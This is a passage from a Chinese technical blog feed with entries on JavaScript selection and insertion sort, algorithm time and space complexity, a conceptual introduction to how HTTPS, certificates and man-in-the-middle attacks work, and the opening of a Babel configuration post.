<h4 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h4><h5 id="算法简介-1"><a href="#算法简介-1" class="headerlink" title="算法简介"></a>算法简介</h5><p>选择排序和冒泡排序一样，同属于基本排序算法。</p>
<p class="tip">算法的时间复杂度为 O(n²)</p>

<h5 id="算法描述-1"><a href="#算法描述-1" class="headerlink" title="算法描述"></a>算法描述</h5><p>选择排序的关键在于 <code>选择</code> 二字，拿数组的第一个元素和数组其他元素作比较，然后找到数组中最小(大)的元素，将最小的元素 <code>选择</code> 出来，放到数组的第一个位置，然后再拿数组的第二个元素和其他元素其他元素作比较，重复之前的比较步骤。这样由于每次都选择最小(大)的元素，将这些元素一次摆放就可以将数组排好序。</p>
<p>一图胜千言（图片来自：<a href="https://github.com/damonare/Sorts" target="_blank" rel="noopener">https://github.com/damonare/Sorts</a>)：</p>
<p><img src="/static/img/selection-sort.gif"></p>
<h5 id="代码实现-1"><a href="#代码实现-1" class="headerlink" title="代码实现"></a>代码实现</h5><p>以升序为例：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">selectionSort</span> (<span class="params">arr</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 从数组的 第一个 元素遍历到数组的 倒数第二个 元素</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.length - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="comment">// min为最小值的索引，被初始化为i，即假设每轮比较的首个元素就是最小的</span></span><br><span class="line">        <span class="keyword">var</span> min = i</span><br><span class="line">        <span class="comment">// 从数组的 i + 1 个元素遍历到数组的 最后一个 元素</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> j = i + <span class="number">1</span>; j &lt; arr.length; j++) &#123;</span><br><span class="line">            <span class="comment">// 与预期的最小值进行比较，如果比预期的最小值还小，就更新最小值</span></span><br><span class="line">            <span class="keyword">if</span> (arr[j] &lt; arr[min]) &#123;</span><br><span class="line">                min = j</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 第二层循环结束时，min索引指向的元素即为最小的元素，交换位置开始下一轮比较</span></span><br><span class="line">        <span class="keyword">var</span> temp = arr[i]</span><br><span class="line">        arr[i] = arr[min]</span><br><span class="line">        arr[min] = temp</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h4><h5 id="算法简介-2"><a href="#算法简介-2" class="headerlink" title="算法简介"></a>算法简介</h5><p>插入排序也属于基本排序算法。</p>
<p class="tip">算法的时间复杂度为 O(n²)</p>

<h5 id="算法描述-2"><a href="#算法描述-2" class="headerlink" title="算法描述"></a>算法描述</h5><p>插入排序的思路是构建有序序列，取出数组的第一个元素，认为其实有序的，然后再取出数组的第二个元素与有序序列中的元素进行比较，然后插入合适的位置，知道数组中的所有元素都被 <code>取出-比较-插入-完成</code>。</p>
<p>一图胜千言（图片来自：<a href="https://github.com/damonare/Sorts" target="_blank" rel="noopener">https://github.com/damonare/Sorts</a>)：</p>
<p><img src="/static/img/insertion-sort.gif"></p>
<h5 id="代码实现-2"><a href="#代码实现-2" class="headerlink" title="代码实现"></a>代码实现</h5><p>以升序为例：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insertionSort</span> (<span class="params">arr</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 从数组第二项开始遍历，即默认第一项为有序的</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">        <span class="comment">// j代表数有序序列的最后一项</span></span><br><span class="line">        <span class="keyword">var</span> j = i - <span class="number">1</span></span><br><span class="line">        <span class="keyword">var</span> temp = arr[i]</span><br><span class="line">        <span class="comment">// 从有序序列最后一项向前扫描，与 temp 对比，如果比temp大，则后移一位</span></span><br><span class="line">        <span class="keyword">while</span> (j &gt;= <span class="number">0</span> &amp;&amp; arr[j] &gt; temp) &#123;</span><br><span class="line">            arr[j + <span class="number">1</span>] = arr[j]</span><br><span class="line">            j--</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 退出循环后，arr[j]的元素是小于等于temp的，所以将temp插入到 j+1 的位置</span></span><br><span class="line">        arr[j + <span class="number">1</span>] = temp</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>基础排序</tag>
      </tags>
  </entry>
  <entry>
    <title>算法-算法的时间复杂度和空间复杂度</title>
    <url>/2018/04/17/%E7%AE%97%E6%B3%95_%E7%AE%97%E6%B3%95%E7%9A%84%E6%97%B6%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6%E5%92%8C%E7%A9%BA%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6/</url>
    <content><![CDATA[<h2 id="算法的时间复杂度和空间复杂度"><a href="#算法的时间复杂度和空间复杂度" class="headerlink" title="算法的时间复杂度和空间复杂度"></a>算法的时间复杂度和空间复杂度</h2><p><img src="/static/img/3539434887-591987400941b_articlex.png" width="550"></p>
<h4 id="算法的评估"><a href="#算法的评估" class="headerlink" title="算法的评估"></a>算法的评估</h4><p>对于一个问题，经常有多种不同的求解算法，这时候我们就需要一个对算法进行评估的标准，找出最优的方案，评估一个算法有以下几个维度：</p>
<ul>
<li>正确性：能正确的实现功能，满足问题的需求。</li>
<li>易读性：通常，写出一个利与人类阅读的代码和利于机器阅读的代码一样重要</li>
<li>健壮性：对于预料之外的输入，也能做出合适的处理。</li>
<li>时空性：算法的时间性能(算法的计算量)和空间性能(算法需要的存储量)、</li>
</ul>
<h4 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h4><h6 id="时间复杂度的计算方法"><a href="#时间复杂度的计算方法" class="headerlink" title="时间复杂度的计算方法"></a>时间复杂度的计算方法</h6><p>时间复杂度：在给定输入(问题规模)下，算法的计算量。</p>
<p>所以说，求一个算法的时间复杂度，就是求这个算法在给定问题规模下的计算量，那么问题来了：如何求算法的计算量？</p>
<p>算法计算量的求法规则如下：</p>
<ul>
<li>1、在算法中选择几种“基本操作”，例如：赋值语句、数学运算语句等等。</li>
<li>2、给定输入下，计算算法执行了多少次“基本操作”。</li>
<li>3、“基本操作”的次数即可作为计算量。</li>
</ul>
<h6 id="实例与大O表示法"><a href="#实例与大O表示法" class="headerlink" title="实例与大O表示法"></a>实例与大O表示法</h6><p>我们以一个例子来说明，求如下表达式的值：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// 阶乘的和</span><br><span class="line">1! + 2! + 3! + ... + n!</span><br></pre></td></tr></table></figure>
<p>我们可以写出如下程序(js代码)：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">factorial</span> (<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> s = <span class="number">0</span>,</span><br><span class="line">        temp = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        temp = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">1</span>; j &lt;= i; j++) &#123;</span><br><span class="line">            temp *= j</span><br><span class="line">        &#125;</span><br><span class="line">        s += temp</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们根据之前总结的算法计算量的求法规则可知，求解一个算法的计算量分为三个步骤，第一步：确定基本操作，对于上面的代码我们所挑选的基本操作如下：</p>
<ul>
<li>第一部分赋值语句：<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="number">0</span></span><br><span class="line">    temp = <span class="number">1</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>当我们的输入规模即 <code>n</code> 变化时，这两条语句的执行次数没有变，始终是 <code>2</code> 次。</p>
<ul>
<li>第二部分赋值语句：<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        temp = <span class="number">1</span></span><br><span class="line">        ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>第一层循环里的 <code>temp = 1</code>，该语句的执行次数等于输入规模 <code>n</code>。</p>
<ul>
<li>乘法计算语句：<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">1</span>; j &lt;= i; j++) &#123;</span><br><span class="line">    temp *= j</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>第二层循环里的 <code>temp *= j</code>，该语句的执行次数，当 <code>n = 1</code> 时执行 1 次，当 <code>n = 2</code> 时执行 <code>1 + 2</code> 次，当 <code>n = 3</code> 时执行 <code>1 + 2 + 3</code> 次，所以该语句的执行次数与输入规模 <code>n</code> 的关系是 <code>1 + 2 + 3 + ... + n = n(n + 1) / 2</code>。</p>
<ul>
<li>加法计算语句：<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    ...</span><br><span class="line">    s += temp</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>第一层循环里的加法赋值语句，该语句的执行次数等于输入规模 <code>n</code>。</p>
<p>综上所述，根据我们选择的“基本操作”，可以计算出该算法的基本操作次数与输入规模 <code>n</code> 的关系如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">T(n) = <span class="number">2</span> + n + n(n + <span class="number">1</span>) / <span class="number">2</span> + n = <span class="number">1</span>/<span class="number">2n</span>^<span class="number">2</span> + <span class="number">3</span>/<span class="number">2n</span> + <span class="number">2</span></span><br></pre></td></tr></table></figure>
<p>当 <code>n</code> 足够大时，<code>n^2</code> 起支配作用，使用 <code>O(n^2)</code> 表示 <code>T(n)</code> 的近似值，这种表示法成为 <code>大 O 表示法</code>。</p>
<h6 id="常见的时间复杂度阶数"><a href="#常见的时间复杂度阶数" class="headerlink" title="常见的时间复杂度阶数"></a>常见的时间复杂度阶数</h6><ul>
<li>常熟阶 O(1)：即算法的计算量不随着输入规模的变化而变化。</li>
<li>线性阶 O(n)</li>
<li>多项式阶 O(n^c)：常见的多项式阶如 O(n^2)、O(n^3)</li>
<li>指数阶 O(C^n)：常见的指数阶如 O(2^n)</li>
</ul>
<p>一般我们认为一个算法的时间复杂度为指数阶的时候，该算法是实际不可运算的，大家可以想象一下，如果一个算法的时间复杂度为 <code>O(2^n)</code> 当 <code>n = 1000</code> 时，这个数值是何等恐怖。更何况我们的输入规模 <code>n</code> 很可能远大于 1000。</p>
<p>另外我们认为时间复杂度为 <code>O(n)</code>、<code>O(log2N)</code>、<code>O(n^2)</code> 是高效的算法。对于合理大的 <code>n</code>，<code>O(n^3)</code> 也是可以接受的。</p>
<h4 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h4><h6 id="空间复杂度的计算方法"><a href="#空间复杂度的计算方法" class="headerlink" title="空间复杂度的计算方法"></a>空间复杂度的计算方法</h6><p>空间复杂度：给定输入(问题规模)下，算法运行时所占用的临时存储空间。</p>
<p>一个算法执行期间所占用的存储量分为三部分：</p>
<ul>
<li>算法本身的代码所占用的空间</li>
<li>输入数据所占用的空间</li>
<li>辅助变量所占用的空间</li>
</ul>
<p>由于实现不同算法所需的代码不会有数量级的差别，所以算法本身代码所占用的空间我们可以不考虑</p>
<p>输入的数据所占用的空间是由问题决定的，与算法无关，所以我们也不需要考虑</p>
<p>我们需要考虑的只有一个：程序执行期间，辅助变量所占用的空间。</p>
<p>计算方法类似于计算算法的时间复杂度，空间复杂度我们用 <code>S(n)</code> 来表示，它同样是输入数据规模 <code>n</code> 的函数，用大 O 表示法记为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">S(n) = O(g(n))</span><br></pre></td></tr></table></figure>
<p>其中 <code>g(n)</code> 是一个关于 <code>n</code> 的函数，如：<code>g(n) = n</code>、<code>g(n) = n^2</code>、<code>g(n) = log2N</code> 等等。</p>
<h6 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h6><p>假设我们有一个数组，该数组有100个元素，写一个转置该数组的算法：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reverse</span> (<span class="params">arr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt;= arr.length / <span class="number">2</span> - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> temp = arr[i]</span><br><span class="line">        arr[i] = arr[arr.length - i - <span class="number">1</span>]</span><br><span class="line">        arr[arr.length - i - <span class="number">1</span>] = temp</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的算法中，我们采用中间变量 <code>temp</code> 对数组的值进行逐个对应的首尾交换，最终达到转置的目的，我们可以看到，辅助变量只有一个即 <code>temp</code>，该变量存储一个数字类型的值，<code>temp</code> 所占用的内存不会随输入数组规模的增大而增大，所以上面算法的控件复杂度为 <code>O(1)</code>，是常数阶，即上面算法的空间复杂度 <code>S(n) = O(1)</code>。</p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>复杂度概念</tag>
      </tags>
  </entry>
  <entry>
    <title>综合-HTTPS原理入门</title>
    <url>/2018/04/17/%E7%BB%BC%E5%90%88_HTTPS%E5%8E%9F%E7%90%86%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h2 id="https-原理入门"><a href="#https-原理入门" class="headerlink" title="https 原理入门"></a><code>https</code> 原理入门</h2><h3 id="一、WHY"><a href="#一、WHY" class="headerlink" title="一、WHY"></a>一、WHY</h3><p>我们先不了聊<code>HTTP</code>，<code>HTTPS</code>，我们先从一个聊天软件说起，我们要实现A能发一个hello消息给B：</p>
<p><img src="/static/img/http1.webp"></p>
<p>如果我们要实现这个聊天软件，本文只考虑安全性问题，要实现</p>
<p class="tip">A发给B的hello消息包，即使被中间人拦截到了，也无法得知消息的内容</p>

<h3 id="二、HOW"><a href="#二、HOW" class="headerlink" title="二、HOW"></a>二、HOW</h3><h4 id="如何做到真正的安全？"><a href="#如何做到真正的安全？" class="headerlink" title="如何做到真正的安全？"></a>如何做到真正的安全？</h4><p>这个问题，很多人马上就想到了各种加密算法，什么对称加密、非对称加密、DES、RSA、XX、噼里啪啦~</p>
<p>而我想说，加密算法只是解决方案，我们首先要做的是理解我们的问题——什么是安全？</p>
<p>我个人的理解是：</p>
<p class="tip">A与B通信的内容，有且只有A和B有能力看到通信的真正内容，<br>好！问题已经定义好了（现实中当然不止这一种定义）。对于解决方案，很容易就想到了对消息进行加密。</p>

<p>题外话，但是只有这一种方法吗？我看未必，说不定在将来会出现一种物质打破当前世界的通信假设，实现真正意义上的保密。</p>
<p>对于A与B这样的简单通信模型，我们很容易做出选择：</p>
<p><img src="/static/img/http2.webp"></p>
<p>这就是对称加密算法，其中图中的密钥S同时扮演加密和解密的角色。具体细节不是本文范畴。</p>
<p>只要这个密钥S不公开给第三者，同时密钥S足够安全，我们就解决了我们一开始所定问题域了。因为世界上有且只有A与B知道如何加密和解密他们之间的消息。</p>
<p>但是，在WWW环境下，我们的Web服务器的通信模型没有这么简单：</p>
<p><img src="/static/img/http3.webp"></p>
<p>如果服务器端对所有的客户端通信都使用同样的对称加密算法，无异于没有加密。那怎么办呢？即能使用对称加密算法，又不公开密钥？请读者思考21秒钟。😜</p>
<p>答案是：Web服务器与每个客户端使用不同的对称加密算法：</p>
<p><img src="/static/img/http4.webp"></p>
<h4 id="如何确定对称加密算法"><a href="#如何确定对称加密算法" class="headerlink" title="如何确定对称加密算法"></a>如何确定对称加密算法</h4><p>慢着，另一个问题来了，我们的服务器端怎么告诉客户端该使用哪种对称加密算法？</p>
<p>当然是通过协商。</p>
<p><img src="/static/img/http5.webp"></p>
<p>但是，你协商的过程是没有加密的，还是会被中间人拦截。那我们再对这个协商过程进行对称加密就好了，那你对协商过程加密的加密还是没有加密，怎么办？再加密不就好了……好吧，进行鸡生蛋蛋生鸡的问题了。</p>
<h4 id="如何对协商过程进行加密"><a href="#如何对协商过程进行加密" class="headerlink" title="如何对协商过程进行加密"></a>如何对协商过程进行加密</h4><p>新问题来了，如何对协商过程进行加密？密码学领域中，有一种称为“非对称加密”的加密算法，特点是私钥加密后的密文，只要是公钥，都可以解密，但是公钥加密后的密文，只有私钥可以解密。私钥只有一个人有，而公钥可以发给所有的人。</p>
<p><img src="/static/img/http6.webp"></p>
<p>虽然服务器端向A、B……的方向还是不安全的，但是至少A、B向服务器端方向是安全的。</p>
<p>好了，如何协商加密算法的问题，我们解决了：使用非对称加密算法进行对称加密算法协商过程。</p>
<p>这下，你明白为什么<code>HTTPS</code>同时需要对称加密算法和非对称加密算法了吧？</p>
<h4 id="协商什么加密算法"><a href="#协商什么加密算法" class="headerlink" title="协商什么加密算法"></a>协商什么加密算法</h4><p>要达到Web服务器针对每个客户端使用不同的对称加密算法，同时，我们也不能让第三者知道这个对称加密算法是什么，怎么办？</p>
<p>使用随机数，就是使用随机数来生成对称加密算法。这样就可以做到服务器和客户端每次交互都是新的加密算法、只有在交互的那一该才确定加密算法。</p>
<p>这下，你明白为什么<code>HTTPS</code>协议握手阶段会有这么多的随机数了吧。</p>
<h4 id="如何得到公钥？"><a href="#如何得到公钥？" class="headerlink" title="如何得到公钥？"></a>如何得到公钥？</h4><p>细心的人可能已经注意到了如果使用非对称加密算法，我们的客户端A，B需要一开始就持有公钥，要不没法开展加密行为啊。</p>
<p>这下，我们又遇到新问题了，如何让A、B客户端安全地得到公钥？</p>
<p>我能想到的方案只有这些：</p>
<p>方案1. 服务器端将公钥发送给每一个客户端</p>
<p>方案2. 服务器端将公钥放到一个远程服务器，客户端可以请求得到</p>
<p>我们选择方案1，因为方案2又多了一次请求，还要另外处理公钥的放置问题。</p>
<h4 id="公钥被调包了怎么办？又是一个鸡生蛋蛋生鸡问题？"><a href="#公钥被调包了怎么办？又是一个鸡生蛋蛋生鸡问题？" class="headerlink" title="公钥被调包了怎么办？又是一个鸡生蛋蛋生鸡问题？"></a>公钥被调包了怎么办？又是一个鸡生蛋蛋生鸡问题？</h4><p>但是方案1有个问题：如果服务器端发送公钥给客户端时，被中间人调包了，怎么办？</p>
<p>我画了张图方便理解：</p>
<p><img src="/static/img/http100.jpeg"></p>
<p>显然，让每个客户端的每个浏览器默认保存所有网站的公钥是不现实的。</p>
<h4 id="使用第三方机构的公钥解决鸡生蛋蛋生鸡问题"><a href="#使用第三方机构的公钥解决鸡生蛋蛋生鸡问题" class="headerlink" title="使用第三方机构的公钥解决鸡生蛋蛋生鸡问题"></a>使用第三方机构的公钥解决鸡生蛋蛋生鸡问题</h4><p>公钥被调包的问题出现，是因为我们的客户端无法分辨返回公钥的人到底是中间人，还是真的服务器。这其实就是密码学中提的身份验证问题。</p>
<p>如果让你来解决，你怎么解决？如果你了解过<code>HTTPS</code>，会知道使用数字证书来解决。但是你想过证书的本质是什么么？请放下你对<code>HTTPS</code>已有的知识，自己尝试找到解决方案。</p>
<p>我是这样解决的。既然服务器需要将公钥传给客户端，这个过程本身是不安全，那么我们为什么不对这个过程本身再加密一次？可是，你是使用对称加密，还是非对称加密？这下好了，我感觉又进了鸡生蛋蛋生鸡问题了。</p>
<p>问题的难点是如果我们选择直接将公钥传递给客户端的方案，我们始终无法解决公钥传递被中间人调包的问题。</p>
<p>所以，我们不能直接将服务器的公钥传递给客户端，而是第三方机构使用它的私钥对我们的公钥进行加密后，再传给客户端。客户端再使用第三方机构的公钥进行解密。</p>
<p>下图就是我们设计的第一版“数字证书”，证书中只有服务器交给第三方机构的公钥，而且这个公钥被第三方机构的私钥加密了：</p>
<p><img src="/static/img/http7.webp"></p>
<p>如果能解密，就说明这个公钥没有被中间人调包。因为如果中间人使用自己的私钥加密后的东西传给客户端，客户端是无法使用第三方的公钥进行解密的。</p>
<p><img src="/static/img/http8.webp"></p>
<p>话到此，我以为解决问题了。但是现实中<code>HTTPS</code>，还有一个数字签名的概念，我没法理解它的设计理由。</p>
<p>原来，我漏掉了一个场景：第三方机构不可能只给你一家公司制作证书，它也可能会给中间人这样有坏心思的公司发放证书。这样的，中间人就有机会对你的证书进行调包，客户端在这种情况下是无法分辨出是接收的是你的证书，还是中间人的。因为不论中间人，还是你的证书，都能使用第三方机构的公钥进行解密。像下面这样：</p>
<p>第三方机构向多家公司颁发证书的情况：</p>
<p><img src="/static/img/http9.webp"></p>
<p>客户端能解密同一家第三机构颁发的所有证书：</p>
<p><img src="/static/img/http10.webp"></p>
<p>最终导致其它持有同一家第三方机构证书的中间人可以进行调包：</p>
<p><img src="/static/img/http11.webp"></p>
<h4 id="数字签名，解决同一机构颁发的不同证书被篡改问题"><a href="#数字签名，解决同一机构颁发的不同证书被篡改问题" class="headerlink" title="数字签名，解决同一机构颁发的不同证书被篡改问题"></a>数字签名，解决同一机构颁发的不同证书被篡改问题</h4><p>要解决这个问题，我们首先要想清楚一个问题，辨别同一机构下不同证书的这个职责，我们应该放在哪？</p>
<p>只能放到客户端了。意思是，客户端在拿到证书后，自己就有能力分辨证书是否被篡改了。如何才能有这个能力呢？</p>
<p>我们从现实中找灵感。比如你是HR，你手上拿到候选人的学历证书，证书上写了持证人，颁发机构，颁发时间等等，同时证书上，还写有一个最重要的：证书编号！我们怎么鉴别这张证书是的真伪呢？只要拿着这个证书编号上相关机构去查，如果证书上的持证人与现实的这个候选人一致，同时证书编号也能对应上，那么就说明这个证书是真实的。</p>
<p>我们的客户端能不能采用这个机制呢？像这样：</p>
<p><img src="/static/img/http12.webp"></p>
<p>可是，这个“第三方机构”到底是在哪呢？是一个远端服务？不可能吧？如果是个远端服务，整个交互都会慢了。所以，这个第三方机构的验证功能只能放在客户端的本地了。</p>
<h4 id="客户端本地怎么验证证书呢？"><a href="#客户端本地怎么验证证书呢？" class="headerlink" title="客户端本地怎么验证证书呢？"></a>客户端本地怎么验证证书呢？</h4><p class="tip">下边的说明并不完全准确，总之，客户端有验证证书是否合法的能力</p>

<p>客户端本地怎么验证证书呢？答案是证书本身就已经告诉客户端怎么验证证书的真伪。</p>
<p>也就是证书上写着如何根据证书的内容生成证书编号。客户端拿到证书后根据证书上的方法自己生成一个证书编号，如果生成的证书编号与证书上的证书编号相同，那么说明这个证书是真实的。</p>
<p>同时，为避免证书编号本身又被调包，所以使用第三方的私钥进行加密。</p>
<p>这地方有些抽象，我们来个图帮助理解：</p>
<p>证书的制作如图所示。证书中的“编号生成方法MD5”就是告诉客户端：你使用MD5对证书的内容求值就可以得到一个证书编号。</p>
<p><img src="/static/img/http13.webp"></p>
<p>当客户端拿到证书后，开始对证书中的内容进行验证，如果客户端计算出来的证书编号与证书中的证书编号相同，则验证通过：</p>
<p><img src="/static/img/http14.webp"></p>
<p>但是第三方机构的公钥怎么跑到了客户端的机器中呢？世界上这么多机器。</p>
<p>其实呢，现实中，浏览器和操作系统都会维护一个权威的第三方机构列表（包括它们的公钥）。因为客户端接收到的证书中会写有颁发机构，客户端就根据这个颁发机构的值在本地找相应的公钥。</p>
<p>题外话：如果浏览器和操作系统这道防线被破了，就没办法。想想当年自己装过的非常规XP系统，都害怕。<br>说到这里，想必大家已经知道上文所说的，证书就是<code>HTTPS</code>中数字证书，证书编号就是数字签名，而第三方机构就是指数字证书签发机构（CA）。</p>
<h4 id="CA如何颁发数字证书给服务器端的？"><a href="#CA如何颁发数字证书给服务器端的？" class="headerlink" title="CA如何颁发数字证书给服务器端的？"></a>CA如何颁发数字证书给服务器端的？</h4><p>当我听到这个问题时，我误以为，我们的SERVER需要发网络请求到CA部门的服务器来拿这个证书。😭 到底是我理解能力问题，还是。。</p>
<p>其实，问题应该是CA如何颁发给我们的网站管理员，而我们的管理员又如何将这个数字证书放到我们的服务器上。</p>
<p>我们如何向CA申请呢？每个CA机构都大同小异，我在网上找了一个：</p>
<p><img src="/static/img/http15.webp"></p>
<p>拿到证书后，我们就可以将证书配置到自己的服务器上了。那么如何配置？这是具体细节了，留给大家google了。</p>
<h4 id="也许我们需要整理一下思路"><a href="#也许我们需要整理一下思路" class="headerlink" title="也许我们需要整理一下思路"></a>也许我们需要整理一下思路</h4><p>我们通过推算的方式尝试还原<code>HTTPS</code>的设计过程。这样，我们也就明白了为什么<code>HTTPS</code>比HTTP多那么多次的交互，为什么<code>HTTPS</code>的性能会差，以及找到<code>HTTPS</code>的性能优化点。</p>
<p>而上面一大堆工作都是为了让客户端与服务器端安全地协商出一个对称加密算法。这就是<code>HTTPS</code>中的SSL/TLS协议主要干的活。剩下的就是通信时双方使用这个对称加密算法进行加密解密。</p>
<p>以下是一张<code>HTTPS</code>协议的真实交互图（从网上copy的，忘了从哪了，如果侵权麻烦告知）：</p>
<p><img src="/static/img/http30.jpeg"></p>
<h4 id="能不能用一句话总结HTTPS？"><a href="#能不能用一句话总结HTTPS？" class="headerlink" title="能不能用一句话总结HTTPS？"></a>能不能用一句话总结<code>HTTPS</code>？</h4><p>答案是不能，因为<code>HTTPS</code>本身实在太复杂。但是我还是尝试使用一段话来总结<code>HTTPS</code>:</p>
<p><code>HTTPS</code>要使客户端与服务器端的通信过程得到安全保证，必须使用的对称加密算法，但是协商对称加密算法的过程，需要使用非对称加密算法来保证安全，然而直接使用非对称加密的过程本身也不安全，会有中间人篡改公钥的可能性，所以客户端与服务器不直接使用公钥，而是使用数字证书签发机构颁发的证书来保证非对称加密过程本身的安全。这样通过这些机制协商出一个对称加密算法，就此双方使用该算法进行加密解密。从而解决了客户端与服务器端之间的通信安全问题。</p>
<h3 id="三、WHAT"><a href="#三、WHAT" class="headerlink" title="三、WHAT"></a>三、WHAT</h3><h4 id="HTTPS的缺点"><a href="#HTTPS的缺点" class="headerlink" title="HTTPS的缺点"></a><code>HTTPS</code>的缺点</h4><ul>
<li><p>SEO方面：据ACM CoNEXT数据显示，使用<code>HTTPS</code>协议会使页面的加载时间延长近50%，增加10%到20%的耗电，此外，<code>HTTPS</code>协议还会影响缓存，增加数据开销和功耗，甚至已有安全措施也会受到影响也会因此而受到影响。</p>
</li>
<li><p>经济方面：SSL证书需要钱，功能越强大的证书费用越高，个人网站、小网站没有必要一般不会用;<br><code>HTTPS</code>连接缓存不如HTTP高效，大流量网站如非必要也不会采用，流量成本太高;</p>
</li>
<li><p><code>HTTPS</code>连接服务器端资源占用高很多，支持访客稍多的网站需要投入更大的成本，如果全部采用<code>HTTPS</code>，基于大部分计算资源闲置的假设的VPS的平均成本会上去;</p>
</li>
<li><p><code>HTTPS</code>协议握手阶段比较费时，对网站的相应速度有负面影响，如非必要，没有理由牺牲用户体验。</p>
</li>
</ul>
<h4 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h4><p>在密码学和计算机安全领域中，中间人攻击（英语：<code>Man-in-the-middle attack</code>，缩写：<code>MITM</code>）是指攻击者与通讯的两端分别创建独立的联系，并交换其所收到的数据，使通讯的两端认为他们正在通过一个私密的连接与对方直接对话，但事实上整个会话都被攻击者完全控制。在中间人攻击中，攻击者可以拦截通讯双方的通话并插入新的内容。在许多情况下这是很简单的（例如，在一个未加密的Wi-Fi 无线接入点的接受范围内的中间人攻击者，可以将自己作为一个中间人插入这个网络）。</p>
<p>一个中间人攻击能成功的前提条件是攻击者能将自己伪装成每一个参与会话的终端，并且不被其他终端识破。中间人攻击是一个（缺乏）相互认证的攻击。大多数的加密协议都专门加入了一些特殊的认证方法以阻止中间人攻击。例如，SSL协议可以验证参与通讯的一方或双方使用的证书是否是由权威的受信任的数字证书认证机构颁发，并且能执行双向身份认证。</p>
<p><img src="/static/img/http31.jpeg"></p>
]]></content>
      <categories>
        <category>综合</category>
      </categories>
      <tags>
        <tag>基础知识</tag>
        <tag>https</tag>
      </tags>
  </entry>
  <entry>
    <title>综合-babel配置</title>
    <url>/2018/09/06/%E7%BB%BC%E5%90%88-babel%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>说起<code>ES6</code>，<code>webpack</code>，打包，模块化总是离不开<code>babel</code>，<code>babel</code>作为一个js的编译器已经被广泛使用。在<code>babel</code>的官网是这样介绍它的：</p>
<blockquote>
<p><strong><code>babel</code> is a JavaScript compiler.<br> Use next generation JavaScript, today.</strong></p>
</blockquote>
<p>大家都知道js作为宿主语言，很依赖执行的环境（浏览器、node等），不同环境对js语法的支持不尽相同，特别是ES6之后，<code>ECMAScrip</code>对版本的更新已经到了一年一次的节奏，虽然每年更新的幅度不大，但是每年的提案可不少。<code>babel</code>的出现就是为了解决这个问题，把那些使用新标准编写的代码转译为当前环境可运行的代码，简单点说就是把<code>ES6</code>代码转译（转码+编译）到ES5。</p>
